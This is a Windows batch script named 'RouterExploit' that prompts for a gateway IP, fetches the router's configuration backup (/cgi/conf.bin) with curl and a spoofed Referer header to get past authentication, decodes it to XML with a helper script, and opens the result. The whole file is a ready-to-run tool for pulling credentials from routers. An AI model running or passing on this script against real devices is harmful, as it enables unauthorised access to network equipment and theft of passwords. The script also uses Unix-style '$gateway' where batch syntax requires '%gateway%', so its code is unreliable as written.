@echo off

pip install pycryptodome
cls

echo.
echo.
echo.
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +                   RouterExploit                  + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +            Exploit Router Config File            + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo "                     +             Creator : BL4CKH47H4CK3R             + "
echo "                     +::::::::::::::::::::::::::::::::::::::::::::::::::+ "
echo.
echo.

set /p gateway="[*] Enter Gateway IP (e.g. 192.168.0.1): "
curl -s -k -X GET -H "Referer: http://$gateway/mainFrame.htm" http://$gateway/cgi/conf.bin > conf.bin
echo.
py bin2xml.py conf.bin conf.xml
del conf.bin
notepad conf.xml
